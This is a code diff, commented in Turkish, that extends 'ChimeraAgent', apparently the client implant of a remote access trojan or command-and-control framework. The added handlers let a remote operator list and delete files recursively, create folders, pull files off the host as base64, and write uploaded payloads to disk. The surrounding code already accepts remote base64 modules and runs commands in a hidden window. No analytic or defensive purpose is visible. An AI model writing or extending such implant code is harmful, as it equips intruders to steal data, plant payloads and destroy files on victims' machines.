@@ -16,6 +16,7 @@ import string
 import types
 import base64
 import threading
+import shutil
 
 # ============================================================
 # Konfigürasyon - generate.py tarafından doldurulacak
@@ -309,17 +310,19 @@ class ChimeraAgent:
         Returns:
             str: Komut çıktısı.
         """
+        cmd_lower = cmd.strip().lower()
+
         # Özel komutlar
-        if cmd.strip().lower() == "terminate":
+        if cmd_lower == "terminate":
             self.running = False
             return "Agent sonlandırılıyor..."
             
         # Özel komutlar - Shell
-        if cmd.strip().lower() == "shell":
+        if cmd_lower == "shell":
             return self.shell_mode()
         
         # Özel komutlar - Modül Yönetimi (Faz 2.1)
-        if cmd.startswith("loadmodule "):
+        if cmd_lower.startswith("loadmodule "):
             try:
                 # Format: loadmodule <name> <b64_code>
                 parts = cmd.split(" ", 2)
@@ -384,15 +387,119 @@ class ChimeraAgent:
             return "Yüklü Modüller:\n" + "\n".join([f"- {name}" for name in self.loaded_modules.keys()])
 
         # Özel komutlar - Dizin Değiştirme (cd)
-        if cmd.strip().lower().startswith("cd "):
+        if cmd_lower.startswith("cd "):
             try:
                 target_dir = cmd.strip()[3:].strip()
+                if not target_dir:
+                    return f"[+] Mevcut dizin: {os.getcwd()}"
                 os.chdir(target_dir)
                 return f"[+] Dizin değiştirildi: {os.getcwd()}"
             except FileNotFoundError:
                 return f"[!] Hata: Dizin bulunamadı: {target_dir}"
             except Exception as e:
                 return f"[!] Hata: {str(e)}"
+        
+        # Özel komutlar - Mevcut Dizin (pwd)
+        elif cmd_lower == "pwd":
+            return os.getcwd()
+
+        # Özel komutlar - Dizin Listeleme (ls)
+        # Kullanım: ls veya ls <path>
+        elif cmd_lower.startswith("ls"):
+            try:
+                target_dir = cmd.strip()[3:].strip()
+                if not target_dir:
+                    target_dir = os.getcwd()
+                
+                if not os.path.exists(target_dir):
+                    return f"[!] Hata: Dizin bulunamadı: {target_dir}"
+                
+                entries = os.listdir(target_dir)
+                output = f"Dizin Listesi: {target_dir}\n"
+                output += "-" * 50 + "\n"
+                
+                # Dosya ve klasörleri ayrıştır
+                dirs = []
+                files = []
+                for entry in entries:
+                    full_path = os.path.join(target_dir, entry)
+                    if os.path.isdir(full_path):
+                        dirs.append(f"[DIR]  {entry}")
+                    else:
+                        size = os.path.getsize(full_path)
+                        files.append(f"[FILE] {entry} ({size} bytes)")
+                
+                output += "\n".join(sorted(dirs) + sorted(files))
+                return output
+            except Exception as e:
+                return f"[!] Listeleme hatası: {str(e)}"
+
+        # Özel komutlar - Klasör Oluşturma (mkdir)
+        elif cmd_lower.startswith("mkdir "):
+            try:
+                path = cmd.strip()[6:].strip()
+                os.makedirs(path, exist_ok=True)
+                return f"[+] Klasör oluşturuldu: {path}"
+            except Exception as e:
+                return f"[!] Oluşturma hatası: {str(e)}"
+
+        # Özel komutlar - Dosya/Klasör Silme (rm)
+        elif cmd_lower.startswith("rm "):
+            try:
+                path = cmd.strip()[3:].strip()
+                if os.path.isdir(path):
+                    import shutil
+                    shutil.rmtree(path)
+                    return f"[+] Klasör silindi: {path}"
+                elif os.path.isfile(path):
+                    os.remove(path)
+                    return f"[+] Dosya silindi: {path}"
+                else:
+                    return f"[!] Bulunamadı: {path}"
+            except Exception as e:
+                return f"[!] Silme hatası: {str(e)}"
+
+        # Özel komutlar - Dosya İndirme (download)
+        # Kullanım: download <remote_path>
+        elif cmd_lower.startswith("download "):
+            try:
+                file_path = cmd.strip()[9:].strip()
+                if not os.path.exists(file_path):
+                    return f"[!] Hata: Dosya bulunamadı: {file_path}"
+                
+                if os.path.isdir(file_path):
+                    return f"[!] Hata: Bu bir klasör, dosya değil."
+
+                with open(file_path, "rb") as f:
+                    file_content = f.read()
+                    b64_content = base64.b64encode(file_content).decode('utf-8')
+                
+                # Özel bir prefix ile gönderiyoruz ki handler bunu anlayıp dosyaya yazabilsin
+                return f"DOWNLOAD_OK:{b64_content}"
+            except Exception as e:
+                return f"[!] İndirme hatası: {str(e)}"
+
+        # Özel komutlar - Dosya Yükleme (upload)
+        # Kullanım: upload <hedef_yol> <b64_data>
+        # (Bu komut handler tarafından oluşturulur)
+        elif cmd.startswith("upload "):
+            try:
+                # İlk boşluğa kadar komut, ikinci boşluğa kadar path, kalanı data
+                parts = cmd.split(" ", 2)
+                if len(parts) < 3:
+                    return "[!] Hata: upload <path> <b64_data>"
+                
+                target_path = parts[1]
+                b64_data = parts[2]
+                
+                file_content = base64.b64decode(b64_data)
+                
+                with open(target_path, "wb") as f:
+                    f.write(file_content)
+                    
+                return f"[+] Dosya başarıyla yüklendi: {target_path} ({len(file_content)} bytes)"
+            except Exception as e:
+                return f"[!] Yükleme hatası: {str(e)}"
 
         try:
             # Komutu gizli pencerede çalıştır
